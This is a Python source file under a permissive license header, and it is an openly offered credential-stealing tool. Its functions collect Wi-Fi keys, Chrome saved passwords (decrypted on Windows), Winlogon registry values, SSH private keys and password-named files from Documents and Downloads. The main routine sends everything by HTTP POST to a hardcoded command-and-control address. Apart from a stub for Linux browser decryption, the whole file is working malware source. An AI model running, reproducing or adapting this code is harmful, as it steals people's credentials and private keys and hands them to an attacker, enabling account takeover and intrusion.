######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import subprocess
import sqlite3
import json
import requests

C2_SERVER_URL = "http://10.0.2.4:8000/receive_credentials"

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        credentials.extend(harvest_windows_wifi_passwords())
        credentials.extend(harvest_windows_browser_passwords())
        credentials.extend(harvest_windows_registry_passwords())
        credentials.extend(harvest_windows_local_files())

    elif os.name == 'posix':
        credentials.extend(harvest_unix_wifi_passwords())
        credentials.extend(harvest_ssh_keys())
        credentials.extend(harvest_unix_browser_passwords())
        credentials.extend(harvest_unix_local_files())

    return credentials

def harvest_windows_wifi_passwords():
    credentials = []
    command = "netsh wlan show profiles"
    profiles = os.popen(command).read()
    for profile in profiles.split('\n'):
        if "All User Profile" in profile:
            profile_name = profile.split(":")[1].strip()
            command = f"netsh wlan show profile name=\"{profile_name}\" key=clear"
            result = os.popen(command).read()
            credentials.append(result)
    return credentials

def harvest_windows_browser_passwords():
    credentials = []
    try:
        import win32crypt

        login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
    except Exception as e:
        credentials.append(f"Failed to extract browser passwords: {e}")
    return credentials

def harvest_windows_registry_passwords():
    credentials = []
    try:
        import winreg

        registry_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path)
            count = winreg.QueryInfoKey(reg_key)[1]
            for i in range(count):
                name, value, _ = winreg.EnumValue(reg_key, i)
                credentials.append(f"Registry Key: {name}, Value: {value}")
            winreg.CloseKey(reg_key)
        except Exception as e:
            credentials.append(f"Failed to extract registry passwords: {e}")
    except ImportError:
        credentials.append("winreg module not available.")
    return credentials

def harvest_windows_local_files():
    credentials = []
    directories_to_search = [
        os.path.expanduser(r"~\Documents"),
        os.path.expanduser(r"~\Downloads")
    ]
    for directory in directories_to_search:
        for root, _, files in os.walk(directory):
            for file in files:
                if 'password' in file.lower():
                    with open(os.path.join(root, file), 'r') as f:
                        credentials.append(f.read())
    return credentials

def harvest_unix_wifi_passwords():
    credentials = []
    command = "sudo cat /etc/NetworkManager/system-connections/*"
    try:
        result = subprocess.check_output(command, shell=True).decode()
        credentials.append(result)
    except subprocess.CalledProcessError as e:
        credentials.append(f"Failed to extract Wi-Fi passwords: {e}")
    return credentials

def harvest_ssh_keys():
    credentials = []
    ssh_keys_path = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_keys_path):
        for file in os.listdir(ssh_keys_path):
            with open(os.path.join(ssh_keys_path, file), 'r') as f:
                credentials.append(f.read())
    return credentials

def harvest_unix_browser_passwords():
    credentials = []
    try:
        login_data_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_linux_password(encrypted_password)
            credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
    except Exception as e:
        credentials.append(f"Failed to extract browser passwords: {e}")
    return credentials

def decrypt_linux_password(encrypted_password):
    pass  # Add the decryption logic here

def harvest_unix_local_files():
    credentials = []
    directories_to_search = [
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads")
    ]
    for directory in directories_to_search:
        for root, _, files in os.walk(directory):
            for file in files:
                if 'password' in file.lower():
                    with open(os.path.join(root, file), 'r') as f:
                        credentials.append(f.read())
    return credentials

def send_to_c2_server(data):
    try:
        response = requests.post(C2_SERVER_URL, json={"data": data})
        if response.status_code == 200:
            print("Data successfully sent to C2 server.")
        else:
            print(f"Failed to send data to C2 server. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to C2 server: {e}")

if __name__ == "__main__":
    creds = harvest_credentials()
    for cred in creds:
        print(cred)
    send_to_c2_server(creds)
